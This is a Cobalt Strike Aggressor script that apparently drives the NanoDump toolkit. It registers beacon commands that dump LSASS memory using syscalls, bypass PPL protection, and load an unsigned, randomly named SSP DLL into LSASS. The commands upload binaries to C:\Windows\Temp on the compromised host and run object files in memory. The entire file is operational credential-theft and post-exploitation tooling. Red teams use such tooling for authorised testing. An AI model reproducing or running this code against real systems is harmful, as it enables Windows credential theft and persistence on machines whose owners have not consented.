
sub generate_rand_string {
local('@dictionary $string $min_length $max_length $length');
    @dictionary = @("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $min_length = $1;
    $max_length = $2;
    $length =  $min_length + rand($max_length - $min_length);
    $string = "";
    while ($length != 0)
    {
        $string = $string . rand(@dictionary);
        $length--;
    }
    return $string;
}

sub is_full_path {
local('$string $c');
    $string = lc($1);
    $c = byteAt($string, 0);
    # 97 -> a, 122 -> z
    if ($c < 97 || $c > 122)
    {
        return false;
    }
    $c = byteAt($string, 1);
    # 58 -> :
    if ($c != 58)
    {
        return false;
    }
    $c = byteAt($string, 2);
    # 92 -> \
    if ($c != 92)
    {
        return false;
    }
    return true;
}

beacon_command_register(
"nanodump",
"Use syscalls to dump LSASS.",
"Usage: nanodump [--getpid] [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--fork] [--snapshot] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe]");
alias nanodump {
    local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_malseclogon $folder $nanodump_binary');

    $barch = barch($1);
    if($barch eq "x86")
    {
        berror($1, "Nanodump does not support x86");
        return;
    }

    # reading lsass requires elevated privileges
    if(!-isadmin $1)
    {
        berror($1, "You need to be admin to run nanodump.");
        return;
    }

    # read in the BOF file
    $handle = openf(script_resource("dist/nanodump." . $barch . ".o"));
    $bof = readb($handle, -1);
    closef($handle);
    if(strlen($bof) == 0)
    {
        berror($1, "could not read bof file");
        return;
    }

    # by default, don't set any decoy binary
    $binary_path = "";
    # by default, do not use MalSecLogon
    $use_malseclogon = 0;
    # by default, do not get the PID of LSASS
    $get_pid = 0;
    # by default, nanodump will find the PID of LSASS dinamically
    $pid = 0;
    # name of the dump when downloaded fileless
    $cname = beacon_info($1, "computer");
    $time = int(ticks() / 1000);
    $dump_path = $cname . "_" . $time . "_lsass.dmp";
    # by default, download the minidump fileless
    $write_file = 0;
    # by default, do not fork the target process
    $fork = 0;
    # by default, do not snapshot the target process
    $snapshot = 0;
    # by default, do not duplicate an LSASS handle
    $dup = 0;
    # by default, the signature of the minidump is invalid
    $use_valid_sig = 0;
    for ($i = 1; $i < size(@_); $i++)
    {
        if (@_[$i] eq "--malseclogon" || @_[$i] eq "-m")
        {
            # use MalSecLogon
            $use_malseclogon = 1;
        }
        else if (@_[$i] eq "--pid" || @_[$i] eq "-p")
        {
            $i++;
            if($i >= size(@_))
            {
                berror($1, "missing --pid value");
                return;
            }
            # set the PID of LSASS
            $pid = @_[$i];
            if(!-isnumber $pid || $pid eq "0")
            {
                berror($1, "Invalid PID: " . $pid);
                return;
            }
        }
        else if (@_[$i] eq "--write" || @_[$i] eq "-w")
        {
            $i++;
            if($i >= size(@_))
            {
                berror($1, "missing --write value");
                return;
            }
            # set the path where the minidump will be written to disk
            $write_file = 1;
            $dump_path = @_[$i];
        }
        else if (@_[$i] eq "--fork" || @_[$i] eq "-f")
        {
            # set arg to true for process forking
            $fork = 1;
        }
        else if (@_[$i] eq "--snapshot" || @_[$i] eq "-s")
        {
            # set arg to true for process snapshot
            $snapshot = 1;
        }
        else if (@_[$i] eq "--dup" || @_[$i] eq "-d")
        {
            # set arg to true for handle duplication
            $dup = 1;
        }
        else if (@_[$i] eq "--valid" || @_[$i] eq "-v")
        {
            # use a valid signature for the minidump
            $use_valid_sig = 1;
        }
        else if (@_[$i] eq "--getpid")
        {
            # get the PID of LSASS and leave
            $get_pid = 1;
        }
        else if (@_[$i] eq "--binary" || @_[$i] eq "-b")
        {
            $i++;
            if($i >= size(@_))
            {
                berror($1, "missing --binary value");
                return;
            }
            # decoy binary path
            $binary_path = @_[$i];
            if(!is_full_path($binary_path))
            {
                berror($1, "You must provide a full path: " . $binary_path);
                return;
            }
        }
        else if (@_[$i] eq "--help" || @_[$i] eq "-h")
        {
            berror($1, beacon_command_detail("nanodump"));
            return;
        }
        else
        {
            berror($1, "invalid argument: " . @_[$i]);
            return;
        }
    }

    if($fork && $snapshot)
    {
        berror($1, "The options --fork and --snapshot cannot be used at the same time");
        return;
    }

    if($use_malseclogon && $dup && strlen($binary_path) == 0)
    {
        berror($1, "If --malseclogon and --dup are used, provide a decoy binary with --binary C:\\Windows\\notepad.exe");
        return;
    }

    if(strlen($binary_path) > 0 && ($use_malseclogon == 0 || $dup == 0))
    {
        berror($1, "The --binary option can only be used when --malseclogon and --dup are used");
        return;
    }

    if($use_malseclogon && !$dup && !is_full_path($dump_path))
    {
        berror($1, "If MalSecLogon is being used locally, you need to provide the full path: ". $dump_path);
        return;
    }

    if($use_malseclogon && $dup == 0 && $write_file == 0)
    {
        berror($1, "The option --malseclogon requires a dump path with --write unless --dup is also provided");
        return;
    }

    if($use_malseclogon && $dup == 0)
    {
        $folder = "C:\\Windows\\Temp";
        $binary_path = $folder . "\\" .  generate_rand_string(5, 10) . ".exe";
        blog($1, "[!] An unsigned nanodump binary will be uploaded to: ". $binary_path .". Use --malseclogon with --dup to avoid this.");
        # read in the EXE file
        $handle = openf(script_resource("dist/nanodump." . $barch . ".exe"));
        $exe = readb($handle, -1);
        closef($handle);
        if(strlen($exe) == 0)
        {
            berror($1, "could not read exe file");
            return;
        }
        # upload the nanodump binary
        bupload_raw($1, $binary_path, $exe);
    }

    # pack the arguments
    $args = bof_pack($1, "iziiiiiiiz", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $get_pid, $use_malseclogon, $binary_path);

    # run
    btask($1, "Running NanoDump BOF");
    beacon_inline_execute($1, $bof, "go", $args);
}

beacon_command_register(
"nanodump_ppl",
"Bypass PPL and dump LSASS.",
"Usage: nanodump_ppl --write C:\\Windows\\Temp\\doc.docx [--valid] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe]");
alias nanodump_ppl {
    local('$barch $handle $bof $exe $args $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $use_malseclogon $binary_path $dll');

    $barch = barch($1);
    if($barch eq "x86")
    {
        berror($1, "Nanodump does not support x86");
        return;
    }

    # reading lsass requires elevated privileges
    if(!-isadmin $1)
    {
        berror($1, "You need to be admin to run nanodump.");
        return;
    }

    # read in the BOF file
    $handle = openf(script_resource("dist/nanodump_ppl." . $barch . ".o"));
    $bof = readb($handle, -1);
    closef($handle);
    if(strlen($bof) == 0)
    {
        berror($1, "could not read bof file");
        return;
    }

    # read in the DLL file
    $handle = openf(script_resource("dist/nanodump_ppl." . $barch . ".dll"));
    $dll = readb($handle, -1);
    closef($handle);
    if(strlen($dll) == 0)
    {
        berror($1, "could not read dll file");
        return;
    }

    $dump_path = "";
    # by default, download the minidump fileless
    $write_file = 0;
    # by default, do not fork the target process
    $fork = 0;
    # by default, do not snapshot the target process
    $snapshot = 0;
    # by default, do not duplicate an LSASS handle
    $dup = 0;
    # by default, the signature of the minidump is invalid
    $use_valid_sig = 0;
    # by default, don't set any decoy binary
    $binary_path = "";
    # by default, do not use MalSecLogon
    $use_malseclogon = 0;
    for ($i = 1; $i < size(@_); $i++)
    {
        if (@_[$i] eq "--write" || @_[$i] eq "-w")
        {
            $i++;
            if($i >= size(@_))
            {
                berror($1, "missing --write value");
                return;
            }
            # set the path where the minidump will be written to disk
            $write_file = 1;
            $dump_path = @_[$i];
        }
        else if (@_[$i] eq "--fork" || @_[$i] eq "-f")
        {
            berror($1, "The parameter --fork is not allowed.");
            return;
            # set arg to true for process forking
            #$fork = 1;
        }
        else if (@_[$i] eq "--snapshot" || @_[$i] eq "-s")
        {
            berror($1, "The parameter --snapshot is not allowed.");
            return;
            # set arg to true for process snapshot
            #$snapshot = 1;
        }
        else if (@_[$i] eq "--dup" || @_[$i] eq "-d")
        {
            # set arg to true for handle duplication
            $dup = 1;
        }
        else if (@_[$i] eq "--valid" || @_[$i] eq "-v")
        {
            # use a valid signature for the minidump
            $use_valid_sig = 1;
        }
        else if (@_[$i] eq "--malseclogon" || @_[$i] eq "-m")
        {
            # use MalSecLogon
            $use_malseclogon = 1;
        }
        else if (@_[$i] eq "--binary" || @_[$i] eq "-b")
        {
            $i++;
            if($i >= size(@_))
            {
                berror($1, "missing --binary value");
                return;
            }
            # decoy binary path
            $binary_path = @_[$i];
            if(!is_full_path($binary_path))
            {
                berror($1, "You must provide a full path: " . $binary_path);
                return;
            }
        }
        else if (@_[$i] eq "--help" || @_[$i] eq "-h")
        {
            berror($1, beacon_command_detail("nanodump"));
            return;
        }
        else
        {
            berror($1, "invalid argument: " . @_[$i]);
            return;
        }
    }

    if ($write_file == 0)
    {
        berror($1, "The --write parameter is must be specified");
        return;
    }

    if(!is_full_path($dump_path))
    {
        berror($1, "You need to provide the full path: ". $dump_path);
        return;
    }

    if($fork && $snapshot)
    {
        berror($1, "The options --fork and --snapshot cannot be used at the same time");
        return;
    }

    if($use_malseclogon && !$dup)
    {
        berror($1, "In this mode, if MalSecLogon is being used, --dup must be provided.");
        return;
    }

    if($use_malseclogon && strlen($binary_path) == 0)
    {
        berror($1, "If --malseclogon is used, provide a decoy binary with --binary C:\\Windows\\notepad.exe");
        return;
    }

    if(strlen($binary_path) > 0 && !$use_malseclogon)
    {
        berror($1, "The --binary option can only be used when --malseclogon and --dup are used");
        return;
    }

    # pack the arguments
    $args = bof_pack($1, "ziiiiizb", $dump_path, $use_valid_sig, $fork, $snapshot, $dup, $use_malseclogon, $binary_path, $dll);

    # run
    btask($1, "Running NanoDumpPPL BOF");
    beacon_inline_execute($1, $bof, "go", $args);
}

beacon_command_register(
"load_ssp",
"Load a Security Support Provider (SSP) into LSASS.",
"Usage: load_ssp [<SSP path>]");
alias load_ssp {
    local('$barch $handle $bof $exe $args $ssp_path');

    $barch = barch($1);
    if($barch eq "x86")
    {
        berror($1, "Nanodump does not support x86");
        return;
    }

    # loading an SSP requires elevated privileges
    if(!-isadmin $1)
    {
        berror($1, "You need to be admin to load an SSP.");
        return;
    }

    # read in the BOF file
    $handle = openf(script_resource("dist/load_ssp." . $barch . ".o"));
    $bof = readb($handle, -1);
    closef($handle);
    if(strlen($bof) == 0)
    {
        berror($1, "could not read bof file");
        return;
    }

    if (size(@_) == 2)
    {
        $ssp_path = $2;
    }
    else
    {
        $folder = "C:\\Windows\\Temp";
        $ssp_path = $folder . "\\" .  generate_rand_string(5, 10) . ".dll";
        blog($1, "[!] An unsigned nanodump DLL will be uploaded to: ". $ssp_path);
        # read in the DLL file
        $handle = openf(script_resource("dist/nanodump_ssp." . $barch . ".dll"));
        $exe = readb($handle, -1);
        closef($handle);
        if(strlen($exe) == 0)
        {
            berror($1, "could not read DLL file");
            return;
        }
        # upload the nanodump binary
        bupload_raw($1, $ssp_path, $exe);
        # rm could also be used
        blog($1, "Delete the DLL with: delete_file " . $ssp_path);
    }

    # pack the arguments
    $args = bof_pack($1, "z", $ssp_path);

    # run
    btask($1, "Running load_ssp BOF");
    beacon_inline_execute($1, $bof, "go", $args);
}

beacon_command_register(
"delete_file",
"Delete a file.",
"Usage: delete_file <file path>");
alias delete_file {
    local('$barch $handle $bof $args');

    $barch = barch($1);

    # make sure the beacon is not WoW64
    $is64 = binfo($1, "is64");
    if($barch eq "x86" && $is64 == 1)
    {
        berror($1, "delete_file does not support WoW64, use: rm");
        return;
    }

    # read in the BOF file
    $handle = openf(script_resource("dist/delete_file." . $barch . ".o"));
    $bof = readb($handle, -1);
    closef($handle);
    if(strlen($bof) == 0)
    {
        berror($1, "could not read bof file");
        return;
    }

    if (size(@_) != 2)
    {
        berror($1, beacon_command_detail("delete_file"));
        return;
    }

    # pack the arguments
    $args = bof_pack($1, "z", $2);

    # run
    btask($1, "Running delete_file BOF");
    beacon_inline_execute($1, $bof, "go", $args);
}
